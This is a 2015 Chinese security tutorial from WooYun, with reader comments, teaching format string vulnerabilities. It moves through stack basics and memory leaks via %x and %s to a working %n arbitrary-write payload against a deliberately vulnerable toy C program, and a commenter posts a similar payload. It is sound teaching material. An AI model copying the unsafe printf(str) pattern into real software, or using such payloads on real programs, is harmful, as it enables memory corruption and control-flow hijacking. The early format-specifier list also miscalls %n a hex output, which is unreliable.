@@ -1,0 +1,242 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">漏洞挖掘基础之格式化字符串</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">珈蓝夜宇</a> <span class="bull">·</span> <time title="2015/10/14 14:51" ui-time="" datetime="2015/10/14 14:51" class="published ng-binding ng-isolate-scope">2015/10/14 14:51</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 序</h1><hr><p>格式化字符串漏洞是一个很古老的漏洞了，现在几乎已经见不到这类漏洞的身影，但是作为漏洞分析的初学者来说，还是很有必要研究一下的，因为这是基础啊!!!所以就有了今天这篇文章。我文章都写好了,就差你来跟我搞二进制了!%>.&lt;%</p><h1>0x01 基础知识&#45;--栈</h1><hr><p>在进行真正的格式化字符串攻击之前，我们需要了解一些基础知识，方便更好的理解该类漏洞。 个人感觉我们还需要一些堆栈相关的基础知识才能更好的理解并运用格式化字符串漏洞。接下来我们就一起看一下栈相关的知识： 说到栈我们不得不提的就是函数调用与参数传递，因为栈的作用就是动态的存储函数之间的调用关系，从而保证在被调用函数返回时能够回到母函数中继续执行。栈其实是一种数据结构，栈中的数据是先进后出（First In Last Out），常见的操作有两种：</p><p>压栈（PUSH）和弹栈（POP），</p><p>用于标识栈属性的也有两个：栈顶（TOP）和栈底（BASE）。</p><p>PUSH：为栈增加一个元素。</p><p>POP：从栈中取出一个元素。</p><p>TOP：标识栈顶的位置，并且是动态变化的，每进行一次push操作，它会自增1，反之，每进行一次pop操作，它会自减1</p><p>BASE：标识栈底位置，它的位置是不会变动的。</p><p>函数调用时到底发生了什么呢，我们将通过下面的代码做一下简单的认识。 示例代码：</p><pre><code>int func_B(arg_B1,arg_B2)
+{
+       int var_B;
+       var_B = arg_B1+arg_B2;
+       return var_B;
+}
+int func_A(arg_A1,arg_A2)
+
+{
+     int var_A;
+     var_A = func_B(arg_A1,arg_A2);
+     return var_A; 
+}
+
+int main (int argc, char **argv, char **envp)
+{
+    int var_main;
+    var_main=func_A(1,2);
+    return var_main;
+}
+</code></pre><p>程序的执行过程如下图所示：</p><p><img alt="Alt text" img-src="eda03cc1dc8294e48f7e5370d470fe52029b241f.jpg"></p><p>通过上图我们可以看到程序执行的流程：<code>main--func_A--func_B--func_A--main</code>，CPU在执行程序时是如何知道各个函数之间的调用关系呢，接下来我们将介绍一个新的名词：栈帧。当函数被调用时，系统栈会为这个函数开辟一个新的栈帧，这个栈帧中的内存空间被它所属的函数独占，当函数返回时，系统栈会弹出该函数所对应的栈帧。32位系统下提供了两个特殊的寄存器（ESP和EBP）识栈帧。</p><ul><li>ESP:栈指针寄存器，存放一个指针，该指针指向栈顶。</li><li>EBP:基址指针寄存器，存放一个指针，该指针指向栈底。</li></ul><p>CPU利用EBP(不是ESP)寄存器来访问栈内局部变量、参数、函数返回地址，程序运行过程中，ESP寄存器的值随时变化，如果以ESP的值为基准对栈内的局部变量、参数、返回地址进行访问显然是不可能的，所以在进行函数调用时，先把用作基准的ESP的值保存到EBP，这样以后无论ESP如何变化，都能够以EBP为基准访问到局部变量、参数以及返回地址。接下来将编译上述代码并进行调试，从而进一步了解函数调用以及参数传递的过程。</p><p>首先用gcc进行编译：<code>gcc -fno-stack-protector -o 1 1.c</code></p><p>用objdump进行反汇编查看：<code>objdump -d 1</code></p><pre><code>    0804841d &lt;main&gt;:
+     804841d:   55                      push   %ebp          ;函数开始（保存旧栈帧的底部）
+     804841e:   89 e5                   mov    %esp,%ebp     ;设置新栈帧底部（切换栈帧）
+     8048420:   83 ec 10                sub    $0x10,%esp    ；设置新栈帧的顶部（抬高栈顶，为新栈帧开辟空间）
+     8048423:   6a 02                   push   $0x2          ；参数入栈（从右往左）
+     8048425:   6a 01                   push   $0x1
+     8048427:   e8 d5 ff ff ff          call   8048401 &lt;func_A&gt; ；向栈中压入当前指令所在的内存地址，保存返回地址
+                                                              ；跳转到所调用函数的入口处执行
+     804842c:   83 c4 08                add    $0x8,%esp
+     804842f:   89 45 fc                mov    %eax,-0x4(%ebp)
+     8048432:   8b 45 fc                mov    -0x4(%ebp),%eax
+     8048435:   c9                      leave  
+     8048436:   c3                      ret 
+
+
+
+     08048401 &lt;func_A&gt;:
+     8048401:   55                      push   %ebp
+     8048402:   89 e5                   mov    %esp,%ebp
+     8048404:   83 ec 10                sub    $0x10,%esp
+     8048407:   ff 75 0c                pushl  0xc(%ebp)
+     804840a:   ff 75 08                pushl  0x8(%ebp)
+     804840d:   e8 d9 ff ff ff          call   80483eb &lt;func_B&gt;
+     8048412:   83 c4 08                add    $0x8,%esp
+     8048415:   89 45 fc                mov    %eax,-0x4(%ebp)
+     8048418:   8b 45 fc                mov    -0x4(%ebp),%eax
+     804841b:   c9                      leave  
+     804841c:   c3                      ret 
+</code></pre><p>func_A栈帧如下图所示：</p><p><img alt="Alt text" img-src="6e079354fd2ee7321e07599fb9f9583b8a0f69cf.jpg"></p><p>我们将通过以下图例对本次函数调用做一个总结：</p><p><img alt="Alt text" img-src="ddaeb0475523bc0ea84f573bfd85e442cad583a9.jpg"></p><p>通过前面的函数调用细节以及栈中数据的分布情况，我们可以发现局部变量是在栈中挨个排放的，如果这些局部变量中有数组之类的缓冲区，并且程序存在数组越界的问题，那么越界的数组元素就有可能破坏栈中相邻变量的值，进而破坏EBP的值、返回地址等重要数据。</p><p>因为本次主要讨论的是格式化字符串漏洞，关于栈溢出的细节就不做讨论了，感兴趣的可以查阅相关资料。</p><p>有了以上的基础知识以后，我们就可以进一步分析格式化字符串漏洞了。</p><h1>0x02 格式化字符串漏洞原理</h1><hr><p>格式化串漏洞和普通的栈溢出有相似之处，但又有所不同，它们都是利用了程序员的疏忽大意来改变程序运行的正常流程。</p><p>接下来我们就来看一下格式化字符串的漏洞原理。</p><p>首先，什么是格式化字符串呢，print()、fprint()等*print()系列的函数可以按照一定的格式将数据进行输出，举个最简单的例子：</p><pre><code>printf("My Name is:  %s" , "bingtangguan")
+</code></pre><p>执行该函数后将返回字符串：My Name is：bingtangguan</p><p>该printf函数的第一个参数就是格式化字符串，它来告诉程序将数据以什么格式输出。上面的例子相信只要学过C语言、上过大学考过计算机二级的都耳熟能详，如果这个都不知道，接下来我真不知道该怎么写了。但是我还是觉得有必要把printf()函数好好写一下。</p><p>printf()函数的一般形式为：<code>printf("format", 输出表列)</code>，我们对format比较关心，看一下它的结构吧：<code>%[标志][输出最小宽度][.精度][长度]类型</code>,其中跟格式化字符串漏洞有关系的主要有以下几点：</p><p>1、输出最小宽度：用十进制整数来表示输出的最少位数。若实际位数多于定义的宽度，则按实际位数输出，若实际位数少于定义的宽度则补以空格或0。</p><p>2、类型：</p><ul><li><p>d 表示输出十进制整数*</p></li><li><p>s 从内存中读取字符串*</p></li><li><p>x 输出十六进制数*</p></li><li><p>n 输出十六进制数</p></li></ul><p>对于其余内容，感兴趣的自行百度吧。</p><p>关于printf()函数的使用，正常我们使用printf()函数应该是这样的：</p><pre><code>char str[100];
+scanf("%s",str);
+printf("%s",str);
+</code></pre><p>这是正确的使用方式，但是也有的人会这么用：</p><pre><code>char str[100];
+scanf("%s",str);
+printf(str)
+</code></pre><p>然后，悲剧就发生了，我们可以对比一下这两段代码，很明显，第二个程序中的printf()函数参数我们是可控的，我们在控制了format参数之后结合printf()函数的特性就可以进行相应的攻击。</p><p><strong># 特性一： printf()函数的参数个数不固定</strong></p><p>我们可以利用这一特性进行越界数据的访问。我们先看一个正常的程序：</p><pre><code>#include &lt;stdio.h&gt;
+int main(void)
+{
+int a=1,b=2,c=3;
+char buf[]="test";
+printf("%s %d %d %d\n",buf,a,b,c);
+return 0;
+}
+</code></pre><p>我们编译之后运行：</p><pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="7b1912151c0f1a151c1c0e1a153b0e190e150f0e">[email&#160;protected]</a>:~/Desktop/format$ gcc -fno-stack-protector -o format format.c
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="73111a1d1407121d141406121d330611061d0706">[email&#160;protected]</a>:~/Desktop/format$ ./format 
+test 1 2 3
+</code></pre><p>接下来我们做一下测试，我们增加一个printf()的format参数，改为：</p><p><code>printf("%s %d %d %d %x\n",buf,a,b，c)</code>，编译后运行：</p><pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="0d6f64636a796c636a6a786c634d786f78637978">[email&#160;protected]</a>:~/Desktop/format$ gcc -z execstack -fno-stack-protector -o format1 format.c
+format.c: In function ‘main’:
+format.c:6:1: warning: format ‘%x’ expects a matching ‘unsigned int’ argument [-Wformat=]
+ printf("%s %d %d %d %x\n",buf,a,b,c);
+ ^
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="a8cac1c6cfdcc9c6cfcfddc9c6e8ddcaddc6dcdd">[email&#160;protected]</a>:~/Desktop/format$ ./format1
+test 1 2 3 c30000
+</code></pre><p>虽然gcc在编译的时候提示了一个warning，但还是编译通过了，我们运行后发现多输出了一个C30000，这是个什么数据呢，我们用gdb调试一下看看吧，我们在printf()函数处下个断点，然后运行程序，程序停在了<code>printf()</code>函数入口处<code>0xb7e652f0 __printf+0 push %ebx</code>。大家可能发现了我的gdb 有点不大一样，是因为我用了一个叫做gdb-dashboard的可视化工具，个人感觉还是比较方便的，可以实时的查看寄存器、内存、反汇编等，感兴趣的同学可以去github下载安装一下试试：<code>https://github.com/cyrus-and/gdb-dashboard</code></p><pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="27454e4940534649404052464967524552495352">[email&#160;protected]</a>:~/Desktop/format$ gdb ./format1
+GNU gdb (Ubuntu 7.8-1ubuntu4) 7.8.0.20141001-cvs
+Copyright (C) 2014 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+&lt;http://www.gnu.org/software/gdb/bugs/&gt;.
+Find the GDB manual and other documentation resources online at:
+&lt;http://www.gnu.org/software/gdb/documentation/&gt;.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ./format1...(no debugging symbols found)...done.
+&gt;&gt;&gt; start
+Temporary breakpoint 1 at 0x8048429
+Starting program: /home/bingtangguan/Desktop/format/format1 
+
+─── Output/messages ────────────────────────────────────────────────────────────
+
+Temporary breakpoint 1, 0x08048429 in main ()
+─── Assembly ───────────────────────────────────────────────────────────────────
+0x08048425 main+10 push   %ebp
+0x08048426 main+11 mov    %esp,%ebp
+0x08048428 main+13 push   %ecx
+0x08048429 main+14 sub    $0x24,%esp
+0x0804842c main+17 movl   $0x1,-0xc(%ebp)
+0x08048433 main+24 movl   $0x2,-0x10(%ebp)
+0x0804843a main+31 movl   $0x3,-0x14(%ebp)
+─── Expressions ────────────────────────────────────────────────────────────────
+─── History ────────────────────────────────────────────────────────────────────
+─── Memory ─────────────────────────────────────────────────────────────────────
+─── Registers ──────────────────────────────────────────────────────────────────
+   eax 0x00000001      ecx 0xbffff070      edx 0xbffff094      ebx 0xb7fc1000  
+   esp 0xbffff054      ebp 0xbffff058      esi 0x00000000      edi 0x00000000  
+   eip 0x08048429   eflags [ PF SF IF ]     cs 0x00000073       ss 0x0000007b  
+   ds 0x0000007b       es 0x0000007b       fs 0x00000000       gs 0x00000033  
+─── Source ─────────────────────────────────────────────────────────────────────
+─── Stack ──────────────────────────────────────────────────────────────────────
+[0] from 0x08048429 in main+14
+(no arguments)
+─── Threads ────────────────────────────────────────────────────────────────────
+[1] id 3590 name format1 from 0x08048429 in main+14
+────────────────────────────────────────────────────────────────────────────────
+&gt;&gt;&gt; break printf
+Breakpoint 2 at 0xb7e652f0: file printf.c, line 28.
+&gt;&gt;&gt; r
+Starting program: /home/bingtangguan/Desktop/format/format1 
+
+─── Output/messages ────────────────────────────────────────────────────────────
+
+Breakpoint 2, __printf (format=0x8048510 "%s %d %d %d %x\n") at printf.c:28
+28  printf.c: No such file or directory.
+─── Assembly ───────────────────────────────────────────────────────────────────
+0xb7e652f0 __printf+0 push   %ebx
+0xb7e652f1 __printf+1 sub    $0x18,%esp
+0xb7e652f4 __printf+4 call   0xb7f3d90b &lt;__x86.get_pc_thunk.bx&gt;
+0xb7e652f9 __printf+9 add    $0x15bd07,%ebx
+─── Expressions ────────────────────────────────────────────────────────────────
+─── History ────────────────────────────────────────────────────────────────────
+─── Memory ─────────────────────────────────────────────────────────────────────
+─── Registers ──────────────────────────────────────────────────────────────────
+   eax 0xbffff03f      ecx 0xbffff070      edx 0xbffff094      ebx 0xb7fc1000  
+   esp 0xbffff00c      ebp 0xbffff058      esi 0x00000000      edi 0x00000000  
+   eip 0xb7e652f0   eflags [ PF ZF IF ]     cs 0x00000073       ss 0x0000007b  
+   ds 0x0000007b       es 0x0000007b       fs 0x00000000       gs 0x00000033  
+─── Source ─────────────────────────────────────────────────────────────────────
+Cannot access "/build/buildd/glibc-2.19/stdio-common/printf.c"
+─── Stack ──────────────────────────────────────────────────────────────────────
+[0] from 0xb7e652f0 in __printf+0 at printf.c:28
+arg format = 0x8048510 "%s %d %d %d %x\n"
+[1] from 0x08048466 in main+75
+(no arguments)
+─── Threads ────────────────────────────────────────────────────────────────────
+[1] id 3594 name format1 from 0xb7e652f0 in __printf+0 at printf.c:28
+</code></pre><p>我们查看一下此时的栈布局：</p><pre><code>&gt;&gt;&gt; x/10x $sp
+0xbffff00c: 0x08048466  0x08048510  0xbffff03f  0x00000001
+0xbffff01c: 0x00000002  0x00000003  0x00c30000  0x00000001
+0xbffff02c: 0x080482bd  0xbffff2c4
+</code></pre><p>我们已经看到了0x00c30000，根据第一节我们对栈帧布局的认识，我们可以想象一下调用printf()函数后的栈的布局是什么样的</p><pre><code> &gt;&gt;&gt; x/20x $sp
+0xbffff00c: 0x08048466  0x08048510  0xbffff03f  0x00000001
+0xbffff01c: 0x00000002  0x00000003  0x00c30000  0x00000001
+0xbffff02c: 0x080482bd  0xbffff2c4  0x0000002f  0x0804a000
+0xbffff03c: 0x740484d2  0x00747365  0x00000003  0x00000002
+0xbffff04c: 0x00000001  0xb7fc13c4  0xbffff070  0x00000000
+</code></pre><p><img alt="Alt text" img-src="aba9339a9c97f17466aa7cf5f4651520fedd288d.jpg"></p><p>看了上面的图，相信大家已经很明白了吧，只要我们能够控制format的，我们就可以一直读取内存数据。</p><pre><code>printf("%s %d %d %d %x %x %x %x %x %x %x %x\n",buf,a,b,c)
+
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="96f4fff8f1e2f7f8f1f1e3f7f8d6e3f4e3f8e2e3">[email&#160;protected]</a>:~/Desktop/format$ ./format2
+test 1 2 3 c30000 1 80482bd bf8bf301 2f 804a000 740484d2 747365
+</code></pre><p>上一个例子只是告诉我们可以利用%x一直读取栈内的内存数据，可是这并不能满足我们的需求不是，我们要的是<code>任意地址读取</code>,当然，这也是可以的，我们通过下面的例子进行分析：</p><pre><code>#include &lt;stdio.h&gt;
+int main(int argc, char *argv[])
+{
+    char str[200];
+    fgets(str,200,stdin);
+    printf(str);
+    return 0;
+}
+</code></pre><p>有了上一个小例子的经验，我们可以直接尝试去读取str[]的内容呢</p><p>gdb调试，单步运行完<code>call 0x8048340 &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="781e1f1d0c0b3808140c">[email&#160;protected]</a>&gt;</code>后输入：</p><p><code>AAAA%08x%08x%08x%08x%08x%08x</code>（学过C语言的肯定知道%08x的意义，不明白的也不要紧，可以先看一下后面的特性三，我这里就不再多说了）</p><p>然后我们执行到printf()函数，观察此时的栈区，特别注意一下0x41414141（这是我们str的开始）：</p><pre><code>&gt;&gt;&gt; x/10x $sp
+0xbfffef70: 0xbfffef88  0x000000c8  0xb7fc1c20  0xb7e25438
+0xbfffef80: 0x08048210  0x00000001  0x41414141  0x78383025
+0xbfffef90: 0x78383025  0x78383025
+</code></pre><p>继续执行，看我们能获得什么，我们成功的读到了AAAA：</p><pre><code>AAAA000000c8b7fc1c20b7e25438080482100000000141414141
+</code></pre><p>这时候我们需要借助printf()函数的另一个重要的格式化字符参数%s，我们可以用%s来获取指针指向的内存数据。</p><p>那么我们就可以这么构造尝试去获取0x41414141地址上的数据：</p><p><code>\x41\x41\x41\x41%08x%08x%08x%08x%08x%s</code></p><p>到现在，我们可以利用格式化字符串漏洞读取内存的内容，看起来好像也没什么用啊，就是读个数据而已，我们能不能利用这个漏洞修改内存信息（比如说修改返回地址）从而劫持程序执行流程呢，这需要看printf()函数的第二个特性。</p><p><strong># 特性二：利用%n格式符写入数据</strong></p><p>%n是一个不经常用到的格式符，它的作用是把前面已经打印的长度写入某个内存地址，看下面的代码：</p><pre><code>#include &lt;stdio.h&gt;
+main()
+{
+  int num=66666666;
+
+  printf("Before: num = %d\n", num);
+  printf("%d%n\n", num, &amp;num);
+  printf("After: num = %d\n", num);
+
+}
+</code></pre><p>可以发现我们用%n成功修改了num的值：</p><pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="04666d6a6370656a636371656a447166716a7071">[email&#160;protected]</a>:~/Desktop/format$ ./format2
+Before: num = 66666666
+66666666
+After: num = 8
+</code></pre><p>现在我们已经知道可以用构造的格式化字符串去访问栈内的数据，并且可以利用%n向内存中写入值，那我们是不是可以修改某一个函数的返回地址从而控制程序执行流程呢，到了这一步细心的同学可能已经发现了，%n的作用只是将前面打印的字符串长度写入到内存中，而我们想要写入的是一个地址，而且这个地址是很大的。这时候我们就需要用到printf()函数的第三个特性来配合完成地址的写入。</p><p><strong># 特性三：自定义打印字符串宽度</strong></p><p>我们在上面的基础部分已经有提到关于打印字符串宽度的问题，在格式符中间加上一个十进制整数来表示输出的最少位数，若实际位数多于定义的宽度，则按实际位数输出，若实际位数少于定义的宽度则补以空格或0。我们把上一段代码做一下修改并看一下效果：</p><pre><code>#include &lt;stdio.h&gt;
+main()
+{
+  int num=66666666;
+
+  printf("Before: num = %d\n", num);
+  printf("%.100d%n\n", num, &amp;num);
+  printf("After: num = %d\n", num);
+}
+</code></pre><p>可以看到我们的num值被改为了100</p><pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="c7a5aea9a0b3a6a9a0a0b2a6a987b2a5b2a9b3b2">[email&#160;protected]</a>:~/Desktop/format$ ./format2
+Before: num = 66666666
+00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+66666666
+After: num = 100
+</code></pre><p>看到这儿聪明的你肯定明白如何去覆盖一个地址了吧，比如说我们要把0x8048000这个地址写入内存，我们要做的就是把该地址对应的10进制134512640作为格式符控制宽度即可：</p><pre><code>printf("%.134512640d%n\n", num, &amp;num);
+printf("After: num = %x\n", num);
+</code></pre><p>可以看到，我们的num被成功修改为8048000</p><pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="afcdc6c1c8dbcec1c8c8dacec1efdacddac1dbda">[email&#160;protected]</a>:~/Desktop/format$ ./format2
+Before: num = 66666666
+中间的0省略...........
+00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000066666666
+After: num = 8048000
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="2042494e4754414e474755414e605542554e5455">[email&#160;protected]</a>:~/Desktop/format$ 
+</code></pre><p>明白了这个原理之后，我们接下来尝试<code>任意地址写</code>作为本章的结束。知识库之前有一篇格式化字符串漏洞文章，在文章最后有一个实例，但是在我按照作者的方法进行测试的时候，发现并不能成功利用，于是我利用任意地址写的方法完成该实验。</p><p>代码参考链接：<code>http://drops.wooyun.org/binary/7714</code></p><pre><code>#include &lt;stdio.h&gt;
+int main(void)
+{ 
+int flag = 0;
+int *p = &amp;flag; 
+char a[100];
+scanf("%s",a);
+printf(a);
+if(flag == 2000)
+    {
+            printf("good!!\n");
+    }
+
+    return 0;
+}
+</code></pre><p>首先分析一下汇编代码，下面这一段代码就是将<em>p指向flag，并且将局部变量flag、</em>p压栈，我们只需要利用格式化字符串漏洞覆盖掉*p指向的内存地址的内容为2000就可以了。</p><pre><code> 80484ac:   c7 45 f0 00 00 00 00    movl   $0x0,-0x10(%ebp)
+ 80484b3:   8d 45 f0                lea    -0x10(%ebp),%eax
+ 80484b6:   89 45 f4                mov    %eax,-0xc(%ebp
+</code></pre><p>下面我们要做到是找到*p指向的内存地址，也就是ebp-0x10的地址。 gdb载入程序，重点关注以上三条指令执行结果：</p><pre><code>&gt;&gt;&gt; x/10x $ebp-0x10
+0xbffff048: 0x00000000  0xb7e4977d  0xb7fc13c4  0xbffff070
+0xbffff058: 0x00000000  0xb7e31a83  0x08048510  0x00000000
+0xbffff068: 0x00000000  0xb7e31a83
+</code></pre><p>现在我们知道了，我们需要将0xbffff048这个地址的内容修改为2000。这里有一点需要特别注意： <code>gdb调试环境里面的栈地址跟直接运行程序是不一样的</code>,也就是说我们在直接运行程序时修改这个地址是没用的，所以我们需要结合格式化字符串漏洞读内存的功能，先泄露一个地址出来，然后我们根据泄露出来的地址计算出ebp-0x10的地址。</p><p>我们继续在gdb调试，执行get()函数后随便输入AAAAAAA，执行到printf()的时候观察栈区：</p><p><img alt="Alt text" img-src="2061fcac06e57aa8bae0185a8d3f182c4ada2363.jpg"></p><p>我们如果只输入%x的话就可以读出esp+4地址上的数据，也就是0xbfffefe4，而我们需要修改的地址为0xbffff048，这两个地址的偏移为0x64。</p><p>下面我们就可以直接运行程序，并输入%x，然后获取ESP+4地址内的值：</p><pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ec8e85828b988d828b8b998d82ac998e99829899">[email&#160;protected]</a>:~/Desktop/format$ ./test
+%x
+bffff024
+</code></pre><p>那我们需要修改的地址就是：0xbffff024+0x64=0xbffff088</p><p>最后就是要在地址0xbffff088处写入2000： \x88\xf0\xff\xbf%10x%10x%10x%1966x%n</p><pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="adcfc4c3cad9ccc3cacad8ccc3edd8cfd8c3d9d8">[email&#160;protected]</a>:~/Desktop/format$ python -c "print '\x88\xf0\xff\xbf%10x%10x%10x%.1966x%n'" &gt; 11
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="fe9c9790998a9f9099998b9f90be8b9c8b908a8b">[email&#160;protected]</a>:~/Desktop/format$ cat 11 | ./test 
+����  bffff024         0         00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003good!!
+</code></pre><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="donate" style="padding:10px;border-top:1px solid #d9d9d9;text-align:center"><span>碎银子打赏，作者好攒钱娶媳妇：</span><br><br><img src="http://static.wooyun.org/wooyun/upload/donate/2015091810333889eb1f26533f0500a60f6d14e6c4d28f.png" style="width:200px;height:200px"></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/binary/7714" rel="bookmark" id="re1">格式化字符串漏洞简介</a></li><li><a href="http://drops.wooyun.org/binary/7428" rel="bookmark" id="re2">逆向基础 OS-specific (一)</a></li><li><a href="http://drops.wooyun.org/papers/1421" rel="bookmark" id="re3">做个试验：简单的缓冲区溢出</a></li><li><a href="http://drops.wooyun.org/papers/9598" rel="bookmark" id="re4">iOS APP安全杂谈之三</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">cmdnotfound</span> <span class="reply-time">2016-04-29 19:52:55</span></div><p></p><p>@ccccccchou 你的问题解决了么，我这里也是这样。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">ccccccchou</span> <span class="reply-time">2016-01-10 22:00:43</span></div><p></p><p>楼主你用的是什么系统呢？ubuntu14.04 32位和64位均不成功，ASLR已经关闭了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">阿楠</span> <span class="reply-time">2015-12-18 22:55:35</span></div><p></p><p>在kali2下面编译调试，flag地址偏移120，120/4=30，所以在%n之前需要30个%x补齐。在开启ASLR用下面代码可以测试通过，<br>%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%1768x%n</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">阿楠</span> <span class="reply-time">2015-12-16 23:02:44</span></div><p></p><p>需要关闭关掉整个linux系统的ASLR保护才能测试成功，谢谢大牛分享</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">sauce</span> <span class="reply-time">2015-10-31 19:25:51</span></div><p></p><p>gdb-dashboard 是直接复制到home下就能用吗 没成功</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">夜神栀穹</span> <span class="reply-time">2015-10-19 20:49:53</span></div><p></p><p>小小心意不成敬意</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">夜神栀穹</span> <span class="reply-time">2015-10-19 20:45:03</span></div><p></p><p>版主一定深谙此道，我希望自己也会有此一天！！我没看懂</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">珈蓝夜宇</span> <span class="reply-time">2015-10-16 14:22:19</span></div><p></p><p>@毕月乌 我不知道是哪位宝宝给我支付宝打了0.1块钱,感谢</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">毕月乌</span> <span class="reply-time">2015-10-16 12:10:14</span></div><p></p><p>不错的文章，搞起搞起~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">珈蓝夜宇</span> <span class="reply-time">2015-10-15 22:22:52</span></div><p></p><p>@左懒 以后我会让你们知道,以后看到52破解的那个ID会这样问: 你是wooyun的珈蓝夜宇?</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">珈蓝夜宇</span> <span class="reply-time">2015-10-15 22:21:18</span></div><p></p><p>@君莫笑 宝宝要写一个漏洞挖掘的合集</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">左懒</span> <span class="reply-time">2015-10-15 20:13:24</span></div><p></p><p>熟悉的ID...楼主是吾爱破解的版主？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">君莫笑</span> <span class="reply-time">2015-10-15 18:03:35</span></div><p></p><p>作者写得挺用心,就是有点重复造轮子的感觉,,,</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">坏男孩-A_A</span> <span class="reply-time">2015-10-15 14:20:51</span></div><p></p><p>66666666666</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" 